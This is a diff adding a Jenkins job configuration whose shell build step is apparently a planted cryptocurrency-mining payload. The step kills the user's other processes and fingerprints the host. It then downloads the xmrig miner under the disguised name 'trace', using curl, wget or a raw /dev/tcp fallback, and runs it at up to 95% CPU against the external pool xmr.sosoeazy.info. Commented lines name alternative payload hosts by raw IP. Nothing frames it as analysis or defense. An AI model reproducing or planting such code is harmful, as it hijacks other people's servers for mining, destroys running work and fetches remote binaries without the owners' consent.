@@ -1,0 +1,84 @@
+<?xml version='1.1' encoding='UTF-8'?>
+<project>
+  <actions/>
+  <description></description>
+  <keepDependencies>false</keepDependencies>
+  <properties/>
+  <scm class="hudson.scm.NullSCM"/>
+  <canRoam>true</canRoam>
+  <disabled>false</disabled>
+  <blockBuildWhenDownstreamBuilding>false</blockBuildWhenDownstreamBuilding>
+  <blockBuildWhenUpstreamBuilding>false</blockBuildWhenUpstreamBuilding>
+  <triggers/>
+  <concurrentBuild>false</concurrentBuild>
+  <builders>
+    <hudson.tasks.Shell>
+      <command>#!/bin/bash
+
+if [[ $(whoami) != &quot;root&quot; ]]; then
+    for tr in $(ps -U $(whoami) | egrep -v &quot;java|ps|sh|egrep|grep|PID&quot; | cut -b1-6); do
+        kill -9 $tr || : ;
+    done;
+fi
+
+threadCount=$(lscpu | grep &apos;CPU(s)&apos; | grep -v &apos;,&apos; | awk &apos;{print $2}&apos; | head -n 1);
+hostHash=$(hostname -f | md5sum | cut -c1-8);
+echo &quot;${hostHash} - ${threadCount}&quot;;
+
+_curl () {
+  read proto server path &lt;&lt;&lt;$(echo ${1//// })
+  DOC=/${path// //}
+  HOST=${server//:*}
+  PORT=${server//*:}
+  [[ x&quot;${HOST}&quot; == x&quot;${PORT}&quot; ]] &amp;&amp; PORT=80
+
+  exec 3&lt;&gt;/dev/tcp/${HOST}/$PORT
+  echo -en &quot;GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n&quot; &gt;&amp;3
+  (while read line; do
+   [[ &quot;$line&quot; == $&apos;\r&apos; ]] &amp;&amp; break
+  done &amp;&amp; cat) &lt;&amp;3
+  exec 3&gt;&amp;-
+}
+
+rm -rf config.json;
+
+d () {
+	curl -L --insecure --connect-timeout 5 --max-time 40 --fail $1 -o $2 2&gt; /dev/null || wget --no-check-certificate --timeout 40 --tries 1 $1 -O $2 2&gt; /dev/null || _curl $1 &gt; $2;
+}
+
+#test ! -s trace &amp;&amp; \
+#    (d http://87.44.19.162/job/Insecure-Jenkins/ws/trace trace || \
+#     d http://54.88.236.33/job/Insecure-Jenkins/ws/trace trace)
+
+test ! -s trace &amp;&amp; \
+    d https://github.com/xmrig/xmrig/releases/download/v2.8.3/xmrig-2.8.3-xenial-amd64.tar.gz trace.tgz &amp;&amp; \
+    tar -zxvf trace.tgz &amp;&amp; \
+    mv xmrig-2.8.3/xmrig trace &amp;&amp; \
+    rm -rf xmrig-2.8.3 &amp;&amp; \
+    rm -rf trace.tgz;
+
+test ! -x trace &amp;&amp; chmod +x trace;
+
+k() {
+    ./trace \
+        -r 2 \
+        -R 2 \
+        --keepalive \
+        --no-color \
+        --donate-level 1 \
+        --max-cpu-usage 95 \
+        --cpu-priority 3 \
+        --print-time 5 \
+        --threads ${threadCount:-4} \
+        --url $1 \
+        --user P \
+        --pass X \
+        --keepalive
+}
+
+k xmr.sosoeazy.info:3333 || k xmr.sosoeazy.info:3333</command>
+    </hudson.tasks.Shell>
+  </builders>
+  <publishers/>
+  <buildWrappers/>
+</project>
